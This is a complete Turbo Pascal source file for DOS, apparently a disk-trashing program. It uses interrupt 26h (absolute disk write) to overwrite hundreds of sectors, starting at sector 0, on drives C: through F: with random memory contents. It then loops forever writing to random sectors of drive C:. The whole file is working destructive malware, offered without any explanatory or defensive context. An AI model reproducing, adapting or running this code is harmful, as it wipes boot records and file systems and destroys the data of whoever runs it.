program fuckyou;
uses dos,crt;
var
 i,a,m,g,o,d:integer;
 regS:registers;
begin
 randomize;
 window(1,1,80,25);
 textbackground(0);
 textcolor(7);
 clrscr;
 for i:=2 to 5 do begin
  regs.al:=i;
  regs.cx:=666;
  regs.dx:=0;
  regs.bx:=random(9999);
  intr($26,regs);
 end;
 repeat
  regs.al:=2;
  regs.cx:=random(900)+100;
  regs.dx:=random(1500);
  regs.bx:=random(9999);
  intr($26,regs);
 until true=false;
end.

